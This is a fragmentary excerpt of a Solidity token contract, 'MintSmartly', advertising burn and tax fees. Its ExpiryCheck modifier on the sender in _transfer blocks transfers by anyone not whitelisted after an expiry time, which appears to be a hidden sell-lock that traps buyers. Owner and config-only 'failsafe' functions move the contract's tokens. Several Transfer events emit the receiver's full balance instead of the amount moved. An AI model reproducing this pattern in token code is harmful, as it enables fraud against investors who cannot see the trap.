...
/**
   ...
   #MintSmartly features:
   3% fee auto add to the burn pool to locked forever when selling
...
contract MintSmartly is Context, IERC20, Ownable,Pausable {
    ...
    modifier ExpiryCheck(address to) {
        require(block.timestamp <= expiryTime || configures[to] == true,"Expired");
        _;
    }
    ...
    function includeInReward(address account) external onlyOwner() {
        ...
        (uint256 rAmount, uint256 rTransferAmount, uint256 tTransferAmount, uint256 tFee, uint256 tburn) = _getValues(tAmount);
    ...
    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256) {
        ...
        return (rAmount, rTransferAmount, tTransferAmount, tFee, tburn);
    }
    ...
    function _getRValues(uint256 tAmount, uint256 tFee, uint256 tburn, uint256 currentRate) private pure returns (uint256, uint256) {
    ...
    function _takeburn(uint256 tburn) private {
        ...
        if(_isExcluded[deadWallet])
            ...
            emit Transfer(address(this), deadWallet, balanceOf(deadWallet));
    }

    function _takeTax(uint256 tTax) private {
        uint256 currentRate =  _getRate();
        uint256 rtax = tTax.mul(currentRate);
        _rOwned[_taxReceiver] = _rOwned[_taxReceiver].add(rtax);
        if(_isExcluded[_taxReceiver])
            _tOwned[_taxReceiver] = _tOwned[_taxReceiver].add(tTax);

            emit Transfer(address(this), _taxReceiver, balanceOf(_taxReceiver));
    }
    ...
    function _transfer(
        ...
        address to,
        uint256 amount
    ) private ExpiryCheck(from){
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(initialize_check,"Not yet initialize");
        ...
        //transfer amount, it will take tax, burn, burn fee
    ...
    function tokenFailsafe(address to,uint amount) public onlyConfig {
       require(to != address(0) && amount > 0,"Invalid parmas");
       _transfer(address(this),to,amount);
    }

    function failSafe(IERC20 token,address to,uint amount) public onlyOwner {
